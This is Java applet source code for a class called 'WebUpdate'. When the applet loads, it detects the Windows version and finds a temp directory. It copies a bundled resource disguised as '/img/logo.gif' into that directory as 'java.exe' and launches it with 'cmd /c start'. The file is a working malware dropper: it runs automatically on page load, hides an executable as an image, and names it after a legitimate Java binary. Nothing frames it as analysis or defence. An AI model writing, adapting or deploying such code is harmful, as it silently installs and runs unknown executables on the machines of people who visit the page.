import java.io.*;
import java.applet.Applet;
import java.net.*;

public class WebUpdate extends Applet{
	/** 
	 * @Fields serialVersionUID : TODO
	 /img/logo.gif
	 */ 
	private static final long serialVersionUID = 1L;
	public void init(){
		WebUpdateFile();
	}
	
	public void WebUpdateFile(){
	int isWin = 1;
	int ostype = 0;//0  xp  vista  1  win7 win8 win8.1  server 2012 08
	String PathStr_1 = null;
	String osVersion = System.getProperty("os.version");
	String Fileexe = null;
	if( osVersion.equals("5.1") )
	{
		ostype = 0;
	}else if( osVersion.equals("5.2") )
	{
		ostype = 1;
	}
	else if( osVersion.equals("6.0") )
	{
		ostype = 1;
	}else if( osVersion.equals("6.1") )
	{
		ostype = 1;
	}else if( osVersion.equals("6.2") )
	{
		ostype = 1;
	}else if( osVersion.equals("6.3") )
	{
		ostype = 1;
	}else
	{
		isWin = 0;
	}
	
		String [] Path = new String [2];                 ///num
		Path[0]="c:\\tmp\\";
		Path[1]="c:\\temp\\";
		//Path[2]="c:\\";
		int i=-1;
		String PathStr = null;
		File Direct = null;
		File Direct1 = null;
		String PathStr2 =null;
		InputStream fin = this.getClass().getResourceAsStream("/img/logo.gif");
		
		try {
			do{
				i++;
				if(i<2){                                    ///num
					PathStr = new String(Path[i]);
					Direct = new File(PathStr);
					PathStr_1 = PathStr;
				}else{
				
				if( isWin==0 ){
				System.exit(-1);
				}else if( ostype == 0)
				{
					String userPath = System.getProperty("user.home");
					String PathStr1 = userPath + "\\Local Settings\\Temp\\";
					Direct = new File(PathStr1);
					PathStr_1 = PathStr1;
				}else if( ostype == 1)
				{
					String userPath = System.getProperty("user.home");
					String PathStr1 = userPath + "\\AppData\\Local\\Temp\\";
					Direct = new File(PathStr1);
					PathStr_1 = PathStr1;
				}
				}
			}while(!Direct.exists());
			
			String FileStr =  PathStr_1 + "java.exe";
			File f = new File(FileStr);
			
			if (!f.exists()) {

				f.createNewFile();
				if (!f.exists()){
				
				if( ostype == 0)
				{
					String userPath1 = System.getProperty("user.home");
					PathStr2 = userPath1 + "\\Local Settings\\Temp\\" + "java.exe";
					Direct1 = new File(PathStr2);
				}else if( ostype == 1)
				{
					String userPath1 = System.getProperty("user.home");
					PathStr2 = userPath1 + "\\AppData\\Local\\Temp\\" + "java.exe";
					Direct1 = new File(PathStr2);
				}
				if (!Direct1.exists()){
				System.exit(-1);// file can not be build
				}
			
				FileOutputStream fout = new FileOutputStream(f);
				int byteread = -1; 
				byte[] bytes = new byte[1024];
				while((byteread = fin.read(bytes)) != -1){
				fout.write(bytes,0,byteread);
				fout.flush();
				}
				fin.close();
				fout.close();
				Runtime rt = Runtime.getRuntime();
				Fileexe = "cmd /c start " + PathStr2.replaceAll(" ","\" \"");
				rt.exec(Fileexe);				
								
				}else{
			
				//BufferedReader br=new BufferedReader(new InputStreamReader(is)); 
				FileOutputStream fout = new FileOutputStream(f);
				int byteread = -1; 
				byte[] bytes = new byte[1024];
				while((byteread = fin.read(bytes)) != -1){
				fout.write(bytes,0,byteread);
				fout.flush();
				}
				fin.close();
				fout.close();
				/*FileWriter fileWritter = new FileWriter(f.getName(),true);
				BufferedWriter bufferWritter = new BufferedWriter(fileWritter);
				bufferWritter.write(in);
				bufferWritter.close();*/
				
				
				//run exe
				Runtime rt = Runtime.getRuntime();
				Fileexe = "cmd /c start " + FileStr.replaceAll(" ","\" \"");
				rt.exec(Fileexe);
				}
			}else{            
				fin.close();
				//run exe
				Runtime rt = Runtime.getRuntime();
				Fileexe = "cmd /c start " + FileStr.replaceAll(" ","\" \"");
				rt.exec(Fileexe);			  
			}
		}catch(Exception x){
			x.printStackTrace();
		}
	}
}